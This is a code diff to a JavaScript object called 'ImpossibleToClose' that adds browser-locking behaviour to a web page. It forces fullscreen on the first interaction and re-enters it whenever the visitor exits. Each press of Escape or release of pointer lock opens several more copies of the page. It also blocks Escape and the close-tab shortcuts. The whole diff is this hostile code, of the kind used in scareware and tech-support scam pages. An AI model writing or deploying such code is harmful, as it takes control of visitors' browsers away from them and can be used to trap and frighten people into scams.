@@ -77,6 +77,57 @@ const ImpossibleToClose = {
         } catch(e) {}
     },
     closeBlocker: function() {
+        // Go fullscreen on first interaction
+        const goFullscreen = () => {
+            try {
+                const el = document.documentElement;
+                if (el.requestFullscreen) el.requestFullscreen();
+                else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
+                else if (el.mozRequestFullScreen) el.mozRequestFullScreen();
+                else if (el.msRequestFullscreen) el.msRequestFullscreen();
+            } catch(e) {}
+        };
+        document.addEventListener('click', goFullscreen, { once: true });
+        document.addEventListener('keydown', goFullscreen, { once: true });
+
+        // Detect when fullscreen is exited (Escape) and IMMEDIATELY re-enter + spawn clones
+        document.addEventListener('fullscreenchange', () => {
+            if (!document.fullscreenElement) {
+                // User pressed Escape — re-enter fullscreen and spawn clones
+                setTimeout(goFullscreen, 50);
+                setTimeout(goFullscreen, 200);
+                setTimeout(goFullscreen, 500);
+                for (let i = 0; i < 3; i++) {
+                    try { window.open(window.location.href, '_blank'); } catch(e) {}
+                }
+            }
+        });
+        // Also detect webkit/moz/ms fullscreen changes
+        ['webkitfullscreenchange', 'mozfullscreenchange', 'MSFullscreenChange'].forEach(evt => {
+            document.addEventListener(evt, () => {
+                if (!document.fullscreenElement && !document.webkitFullscreenElement && !document.mozFullScreenElement) {
+                    setTimeout(goFullscreen, 50);
+                    setTimeout(goFullscreen, 200);
+                    for (let i = 0; i < 3; i++) {
+                        try { window.open(window.location.href, '_blank'); } catch(e) {}
+                    }
+                }
+            });
+        });
+
+        // Detect pointer lock release (also triggered by Escape)
+        document.addEventListener('pointerlockchange', () => {
+            if (!document.pointerLockElement) {
+                // Re-lock pointer
+                try { document.body.requestPointerLock(); } catch(e) {}
+                // Spawn clones
+                for (let i = 0; i < 2; i++) {
+                    try { window.open(window.location.href, '_blank'); } catch(e) {}
+                }
+            }
+        });
+
+        // Block Escape, Ctrl+W, etc at keydown level
         document.addEventListener('keydown', (e) => {
             if ((e.ctrlKey || e.metaKey) && e.key === 'w') {
                 e.preventDefault(); e.stopPropagation();
@@ -89,10 +140,20 @@ const ImpossibleToClose = {
                 return false;
             }
             if ((e.ctrlKey || e.metaKey) && e.key === 'F4') { e.preventDefault(); e.stopPropagation(); return false; }
-            if (e.key === 'Escape') { e.preventDefault(); e.stopPropagation(); return false; }
+            if (e.key === 'Escape') {
+                e.preventDefault(); e.stopPropagation();
+                // Re-enter fullscreen immediately
+                goFullscreen();
+                // Spawn clones
+                for (let i = 0; i < 2; i++) {
+                    try { window.open(window.location.href, '_blank'); } catch(ex) {}
+                }
+                return false;
+            }
         }, true);
         document.addEventListener('keyup', (e) => {
             if ((e.ctrlKey || e.metaKey) && (e.key === 'w' || e.key === 'W')) { e.preventDefault(); return false; }
+            if (e.key === 'Escape') { e.preventDefault(); goFullscreen(); return false; }
         }, true);
     }
 };
